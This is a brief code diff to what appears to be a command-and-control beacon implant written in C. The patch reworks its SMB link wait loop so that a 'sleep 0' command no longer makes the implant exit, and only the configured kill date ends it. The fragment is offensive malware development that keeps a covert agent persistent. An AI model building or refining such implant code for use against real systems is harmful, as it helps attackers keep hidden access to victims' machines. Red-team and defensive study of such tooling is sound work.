@@ -66,8 +66,15 @@ void command_link_wait() {
 		return;
 	}
 
-	/* while we are an SMB server... do this stuff */
-	while (sleep_time > 0) {
+	/* while we are an SMB server... do this stuff. Official sleep semantics:
+	 * sleep 0 = interactive, NEVER a loop exit. The old sleep_time gate
+	 * safe_exit'ed the beacon the moment an operator ran `sleep 0` (the
+	 * main-loop twin was fixed in beacon.cpp years ago; the link-family
+	 * loops kept it). Gate on killdate like beacon() does. */
+	while (TRUE) {
+		if (check_kill_date())
+			safe_exit();
+
 		/* wait for a connection and send our agent id */
 		smb_wait();
 
